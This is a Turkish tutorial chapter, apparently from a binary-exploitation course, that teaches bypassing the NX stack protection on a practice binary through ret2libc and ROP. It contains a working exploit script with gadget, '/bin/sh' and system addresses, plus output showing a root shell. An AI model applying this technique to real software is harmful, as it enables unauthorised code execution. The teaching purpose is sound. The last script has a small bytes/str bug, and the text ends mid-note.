# Hedefimiz
Önceki bölüm ile aynı hedefe sahibiz, programın akışını değiştirerek
bir shell çalıştırmak.

# Kod analizi
Tahmin ediyorum ki bu bölümü okumadan önce kodu incelediniz ve de önceki
bölüm ile birebir aynı olduğunu gördünüz. Hayır merak etmeyin bir hata
falan yok, kodumuz ve hedefimiz aynı. Bu bölümdeki değişiklik kodda değil,
kodun derlenme şeklinde...

### NO EXECUTE!!
Derlemenin neden bu kadar önemli olduğuna gelince, eğer önceki bölüm için yazdığınız
exploiti bu bölüm üzerinde denerseniz segfault alıcaksınız ve exploit başarısız olacak.

Bunun sebebi önceki bölümde derleme aşamasında derleyiciye `execstack` isimli bir argüman
sağlamam. İsminden de anlayabileceğiniz gibi bu argüman stack üzerindeki kodun çalıştırılabilir
olmasını sağlıyor. Bu opsiyon olmadan stack üzerindeki alan çalıştırılamaz olduğundan kodumuz
stacke dönüş yapmaya çalışınca segfault hatası ile karşılaşıyor.

Stack üzerindeki kodun çalıştırılamaz olması, önceki bölümde yazdığımız gibi shellcode
çalıştırmayı önlemek amaçlıdır. Sonuçta programın kendisi stack üzerinde kod çalıştırmadığından
stackin bellek bölgesini çalıştırılabilir yapıp gereksiz bir saldırı noktası oluşturmaya gerek yok
değil mi?

Peki bu stack'i çalıştırılamaz yapma olayı tam olarak nasıl çalışıyor? Bu aslında CPU'nun bir
özelliği, sanal bellek adresinde belirli alanları çalıştıralamaz olarak işaretlemek için **NX
bit**i olarak adlandırılan bir özellik.

`execstack` opsiyonu belirtince GCC ELF headerında, `PT_GNU_STACK` bölümü altında, `PF_X` flagi
ile stack'in bellek segmentini "çalıştırılabilir" olarak işaretliyor. Daha sonra kernel ELF programının
çalışması sırasında bu headerı okuyor, ve stack executable mı diye kontrol ediyor. Eğer executable değilse,
stack'in yer aldığı sanal bellek sayfası için NX bitini (EFER register'ının 11. biti) 1 olarak ayarlıyor,
diğer türlü 0 olarak ayarlıyor.

Daha fazla detay kernel'in `arch/x86/include/asm/elf.h` header dosyasında bulunabilir:
```
/*
 * An executable for which elf_read_implies_exec() returns TRUE will
 * have the READ_IMPLIES_EXEC personality flag set automatically.
 *
 * The decision process for determining the results are:
 *
 *                 CPU: | lacks NX*  | has NX, ia32     | has NX, x86_64 |
 * ELF:                 |            |                  |                |
 * ---------------------|------------|------------------|----------------|
 * missing PT_GNU_STACK | exec-all   | exec-all         | exec-none      |
 * PT_GNU_STACK == RWX  | exec-stack | exec-stack       | exec-stack     |
 * PT_GNU_STACK == RW   | exec-none  | exec-none        | exec-none      |
 *
 *  exec-all  : all PROT_READ user mappings are executable, except when
 *              backed by files on a noexec-filesystem.
 *  exec-none : only PROT_EXEC user mappings are executable.
 *  exec-stack: only the stack and PROT_EXEC user mappings are executable.
 *
 *  *this column has no architectural effect: NX markings are ignored by
 *   hardware, but may have behavioral effects when "wants X" collides with
 *   "cannot be X" constraints in memory permission flags, as in
 *   https://lkml.kernel.org/r/20190418055759.GA3155@mellanox.com
 *
 */
```

Stack'in executable olduğu bir program çalıştırınca, bu aynı zamanda kernel kayıtlarına
düşecektir (`dmesg` ile kayıtları okuyabilirsiniz).

### Farklı bellek korumaları kontrol etmek
NX ile stacki executable yamak, ilk bölümde bahsetiğim bellek korumalarından biri.
Bu bellek korumalarını kontrol etmek için, pwntools'un bir parçası olan (makinede kurulu gelen)
`checksec` isimli bir aracı kullanacağız:
```bash
pwn checksec 0x2.elf
```
Bu size hangi bellek korumalarının aktif olduğunu gösterecektir:
```
root@o101:~/0x2# pwn checksec 0x2.elf
[*] '/root/0x2/0x2.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Gördüğünüz gibi `0x2` için `NX` koruması açık.

Özetlemek gerekirse artık stack üzerinden kod çalıştırmamız mümkün değil, bu exploit
etmemiz imkansız mı demek? Tabiki hayır!

### ret2libc
Hatırlarsanız, dönüş adresinin kontrolü hala bizde, sadece belirli bir adres aralığına
dönüş yapamadığımız gerçeği bizim için birşey değiştirmiyor, hala dönüş yapabileceğimiz
birçok adres var.

Örneğin programın içinde olan bir adrese dönüş yapabiliriz, bunun yanı sıra programın
çalışması için runtime'da yüklenen librarylerden birine ait bir adrese de dönüş yapabiliriz.

İşte burda `ret2libc` isimli bir metodu kullanacağız. Her standart program gibi bu program da
GNU C librarysine (glibc) karşı linklenmiş durumda, bunu `ldd` komutu ile de görebilirsiniz:
```bash
ldd 0x2.elf
```
Bu library C dili için ana fonksiyonları sağladığından oldukça geniş. Bu durum bize dönüş
yapabileceğimiz bir sürü adres sağlıyor. Farklı adreslere dönüş yaparak kodun akışını yine
istediğimiz gibi kontrol edip bir shell çalıştırabiliriz.

Bu, farklı kod parçalarını içeren adreslere dönüş yapma tekniğine genel olarak *ROP (return-oriented programming, dönüş tabanlı programlama)*
deniyor. Spesifik olarak `libc` adreslerine dönüş yaptığımızda ise bu teknik *ret2libc* olarak sınıflandırılıyor.

Şimdi teoride exploitimizi kurguladığımıza göre pratiğe geçelim.

# Exploit
`/bin/sh` shell'ini çalıştırmak için kullanabileceğimiz bir kaç farklı fonksiyon mevcut, shellcode
da olduğu gibi `execve` veya benzerlerinden (`execvp`, `execle` vs.) birini kullanabiliriz. Fakat
biz (daha sonra göreceğiniz üzere işleri biraz daha kolaylaştırmak adına) `system` fonksiyonunu
kullanacağız.

Kullanımı gayet basit (`man system`):
```
SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION
       The  system()  library  function  behaves as if it used fork(2) to create a
       child process that executed the shell command specified  in  command  using
       execl(3) as follows:

           execl("/bin/sh", "sh", "-c", command, (char *) NULL);

       system() returns after the command has been completed.
```
Bu fonksiyona sadece bir komutu argüman sağlamamız lazım, o da bizim için komutu bir
child process altında `execl` fonksiyonu ile çalıştıracak.

Sanırım sorunun farkına varıyorsunuz, `system`in adresine dönüş yaparak `system`i çağırabiliriz,
ama nasıl `/bin/sh`ı bir argüman olarak geçeceğiz ki? Merak etmeyin buna geleceğiz, önce bir
`system`in adresine dönelim. Bunun için önce `system`in adresine ihtiyacımız var.
Bunu bulmanın birkaç yolu var, `gdb` ile yapabiliriz:
```
gdb ./0x2.elf
run
```
Burda input kısmına Ctrl+C yaparak programa interrupt gönderebilirz, ya da uzun bir
metin girerek segfault'a sebep olabiliriz, sadece bir şekilde programı sonlandırmamız
lazım, bunun için breakpointde koyabilirsiniz, bundan sorna tek yapmanız gerek `system`
adresini print etmek:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0x7ffff7e26c30 <system>
```
Komutu ile `system` fonksiyonun adresini alabilirsiniz. Hadi bunu dönüş adresine
yazmak için exploitimizi yazalım:
```python
from struct import pack

filler  = b"A"*40
system  = pack("<Q", 0x<system'in adresi>)

f = open("/tmp/ex", "wb")
f.write(filler+system)
f.close()
```
Fakat henüz hazır değiliz, bir şekilde, `/bin/sh`'ı argüman olarak `system`e vermemiz lazım.

Assembly'de bir fonksiyonun diğer fonksiyonu çağırmadan önce yapması gerekenleri, argümanların
nasıl fonksiyonlar arasında iletileceğini ve de dönüş değerinin nasıl yapılacağını belirten bir
standart var. Biz buna **Calling Convention** diyoruz. Farklı mimarilerin ve farklı işletim sistemlerinin
conventionları farklı. Ama genel olarak terimler aynı. Hadi aşağıdaki örnek üzerinden gidelim:
```c
#include <stdlib.h>

void foo(){
    return;
}

void main(){
    foo();
    return 0;
}
```
Bu programda, `main` fonskiyonu `foo` fonksiyonunu çağırıyor. Bu durumda biz `main` fonskiyonuna **caller**
ve `foo` fonksiyonuna da **callee** diyoruz. Bir `x86_64` Linux sisteminde, bu çağrı durumunda
assembly seviyesinde aşağıdakiler gerçekleşir:
- Caller birinci, ikinci ve diğer takip eden argümanları sırası ile aşağıdaki registerlara koyar:
  * `rdi`: İlk argüman
  * `rsi`: İkinci argüman
  * `rdx`: Üçüncü argüman
  * `rcx`: Dördüncü argüman
  * `r8`: Beşinci argüman
  * `r9`: Altıncı argüman
- Caller callee için yeni bir stack frame oluşturur
- Caller callee'ye çağrıda bulunur (`call`)
- Callee işlemini bitirince dönüş değerlerini sırası ile aşağıdaki registerlara koyar:
  * `rax`: İlk dönüş registerı
  * `rdx`: İkinci dönüş registerı
- Callee kendi stack frameini siler
- Callee caller'a kaldığı yerden geri dönüş yapar (`ret`)

Bu yeni edindiğimiz bilgiler ışığında artık, `/bin/sh` argümanını `rdi` registerına koymamız gerektiğini
biliyoruz, ama hala iki sorun var:
- `/bin/sh`a işaret eden bir adres nasıl bulacağız?
- Bu adresi `rdi`a nasıl yazacağız?

Hadi ilk sorun ile başlayalım. GNU C librarysi içinde aslında `/bin/sh` stringi mevcut. Bunu `strings`
komutu ile bulabiliriz:
```bash
strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```
Bu size glibc içindeki adresini vericek, bunu glibc'inin bellekde yüklendiği adrese ekleyerek `/bin/sh`ın
gerçek adresini bulabiliriz. Bu yükleme adresini bulmak için gdb içinde:
```
info proc map
```
Komutunu çalıştırabilirsiniz. bu size birkaç tane glibc girdisi gösterecek. Program aslında sadece bir kere
glibc'yi yüklüyor. Fakat glibc'nin farklı izinlere sahip farklı segmentleri olduğundan birden fazla glibc
var gibi görünüyor. Bizim aradığımız adres ilk baştaki glic'ye ait olan "Start Addr".

Bu adresi strings'den bulduğumuz adrese ekleyerek `/bin/sh`ın adresini doğrulayabiliriz:
```
(gdb) x/s 0x7ffff7dd9000+0x199e28
0x7ffff7f72e28: "/bin/sh"
```
Güzel artık elimizde `/bin/sh` stringine işaret eden bir adres var, şimdi ikinci sorunu halledelim,
bu adresi `rdi`a nasıl yacağız? Sadece stack'i kontrol ediyoruz, registerların üzerine yazmamız mümkün
değil. Ya da öyle mi?

### Gadget vakti!
Farkettiniz mi bilmiyorum ama dönüş adresini sadece bir kere kontrol etmiyoruz, yaptığımız çağrı
programı çökertmeden `ret` komutuna ulaştığı sürece dönüş adresini kontrol edebiliriz ve birden fazla
adrese dönüş yapabiliriz.

Bu bilgiyi gadget bilgisi ile birleştirmemiz lazım. **Gadget** ya da şuanki exploitimiz için **ROP gadget**
dediğimiz şey programın akışını manipüle etmemize yardımcı olan küçük komut parçaları. Dönüş adresini kontrol
ediyoruz sonuçta değil mi? İlla da bir fonksiyona dönüş yapmak zorunda değiliz, sadece belirli bir komut parçasına
dönüş yapabiliriz, sonunda `ret`e eriştiğimiz sürece program akışı hala bizim kontrolümüz altında.

`rdi`ya veri yüklmenin tek yolu, stack'den veriyi `pop`latmak olacaktır. Veriyi stack'e yerleştirip
`pop rdi` komutunu çalıştıran bir adrese dönüş yaparsak `rdi`a stackden istediğimiz veriyi yükleyebiliriz.
Ha tabi, `pop rdi`dan sonra `ret` komutunun gelmesi lazım. Bu sayede kaldığımız yerden devam edip `system`
çağrısını yapabiliriz.

Tamam yani `pop rdi` ve arkasından `ret` çalıştırcak bir gadget'a ihtiyacımız var, bu gadget'ın adresini
nasıl bulacağız? Önceden dediğim gibi, glibc oldukça geniş bir library elbette içinde `pop rdi` ve arkasından
`ret` çalıştıran bir adres vardır.

Bu adresi bulmak için [`ropper`](https://github.com/sashs/Ropper) isimli bir (makinede kurulu gelen) gadget
bulma aracını kullanacağız. Bu araca alternatif olarak [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget)
ve [`ropr`](https://github.com/ben-lichtman/ropr) isimli iki araç daha mevcut, dilerseniz bu araçları da kullanabilirsiniz
(bu araçlar makinede kurulu değil). Ben kullanımı rahat olduğundan `ropper` ile devam ediyor olacağım.

`ropper` ile istediğimiz gadgeti glibc içinde bulmak için:
```bash
ropper --file /usr/lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret"
```
Bu komut size yine `/bin/sh` durumunda olduğu gibi glibc içindeki adresini vericektir. Bunu gdb'deki glibc adresine
ekleyerek asıl adresi bulup doğrulayabiliriz:
```
(gdb) x/1i 0x7ffff7dd9000+0x0000000000026265
   0x7ffff7dff265 <iconv+181>:  pop    rdi
(gdb) x/1i 0x7ffff7dff266
   0x7ffff7dff266 <iconv+182>:  ret
```

Herşey hazır şimdi hepsini bir araya koyalım:
```python
from struct import pack

filler = b"A"*40
poprdi = pack("<Q", 0x<gadget adresi>)
binsh  = pack("<Q", 0x</bin/sh adresi>)
system = pack("<Q", 0x<system adresi>)

f = open("/tmp/ex", "wb")
f.write(filler+poprdi+binsh+system)
f.close()
```
Şimdi exploitimizi test etme vakti:
```
python3 exploit.py
gdb ./0x2.elf
r < /tmp/ex
```
Veeee... başarısız olduk?
```
(gdb) r < /tmp/ex
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/0x2/0x2 < /tmp/ex
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Hello, what's your name?
Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e2691b in ?? () from /usr/lib/x86_64-linux-gnu/libc.so.6
```
Program segfault ile sonlandı. Bu ilginç işte, eğer `system`e bir break point
koyarsanız bu adrese eriştiğimizi, aynı zamanda `info registers` ile `rdi`ın doğru adrese sahip
olduğunu doğrulayabilirz.

Segfault `system` fonksiyonun içinde gerçekleşiyor, hadi segfault'u aldığımız
tam komutu bir inceleyelim:
```
(gdb) x/1i 0x00007ffff7e2691b
=> 0x7ffff7e2691b:      movaps XMMWORD PTR [rsp+0x50],xmm0
```
Bir `movaps` komutu sırasında segfault alıyoruz. Assembly biliyorsanız sorunu büyük ihtimalle çoktan
çözdünüz. Sorun stack'in hizalaması ile ilgili.

### Derinlere bakmak
Calling conventionlarını detaylı incelerseniz, ["Caller clean-up"](https://wikiless.northboot.xyz/wiki/X86_calling_conventions?lang=en#Variations)'ın
"Variations" kısmında Linux sistemlerinde GCC versiyon 4.5'ten itibaren stack'in 16 byte sınırlamalar ile hizallandığını göreceksiniz.

Yani callee caller'dan çağrı aldığında stack'in 16-byte bir sınırlama ile hizalanmış olmasını bekliyor. Burda `movaps`
komutunda segfault alıyoruz çünkü bu virgüllü sayılar ile uğraşmaya yarıyan SSE komutlarından biri ve stack'in 16-byte
ile hizalanmasını bekliyor. Callee yani `system` stack'in zaten 16-byte illa hizalandığını düşündüğünden stack üzerinde
bir modifikasyon yapmadan `movaps`i çağırıyor ve segfaulta neden oluyor.

Bu durumda çözüm stack'i 16-byte ile hizalamak olacaktır. Segfault sonrası `info reg` ile `rsp` registerına bakarsak
16 byte ile hizalanmadığını göreceksiniz:
```
(gdb) info reg
rax            0x7ffff7fb8d58      140737353846104
...
rsp            0x7fffffffe6f8      0x7fffffffe6f8
```
Bu durumda `rsp` `0x7fffffffe6f8` değerine sahip (tabiki sizde farklı olabilir), bunu pythonda 16'ya bölmeyi
deniyebiliriz:
```
root@o101:~/0x2# python3 -c 'print(0x7fffffffe6f8/16)'
8796093021807.5
```
Gördüğünüz gibi tam bölünmüyor, hizalamak adına üzerine bir 8 daha ekleyebiliriz:
```
root@o101:~/0x2# python3 -c 'print((0x7fffffffe6f8+8)/16)'
8796093021808.0
```
Yani stack'e `system` adresinden önce bir 8 byte daha eklememiz lazım. Sadece yer doldurmak için kullacağımız
bir adres olacağından ideal olarak sadece `ret` komutunu çalıştırcak bir adres iyi olur. Bunun için önceki gadget'ımızı
kullanabiliriz. Önceki gadgetımız `pop rdi`'ın arkasından `ret` çalıştırıyordu. Tek yapmamız gerek adrese 1 eklemek,
bu sayede sadece `ret`in adresini alabiliriz. Tabi illa bu `ret`i kullanmak zorunda değilsiniz, programın içinden
bir `ret` adresi seçebilirsiniz, ya da `ropper` ile herhangi bir `ret` adresi bulabilirsiniz.

Hadi şimdi exploitimize bu yeni `ret` adresini ekleyelim:
```python
from struct import pack

filler = b"A"*40
poprdi = pack("<Q", 0x7ffff7dff265) # pop rdi; ret
binsh  = pack("<Q", 0x7ffff7f72e28) # /bin/sh
ret    = pack("<Q", 0x7ffff7dff266) # ret
system = pack("<Q", 0x7ffff7e26c30) # system()

f = open("/tmp/ex", "wb")
f.write(filler+poprdi+binsh+ret+system+"\n")
f.close()
```
Yeni exploitimizi denemek için:
```
root@o101:~/0x2# python3 exploit.py && (cat /tmp/ex; echo; cat) | ./0x2.elf
Hello, what's your name?
Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe!
id
uid=0(root) gid=0(root) groups=0(root)
```
Ta-da! NX bellek korumasına rağmen shell çalıştırmayı başardık.

> [!IMPORTANT]
> Dö

---
[Önceki](0x1.md) | [Sonraki](0x3.md)
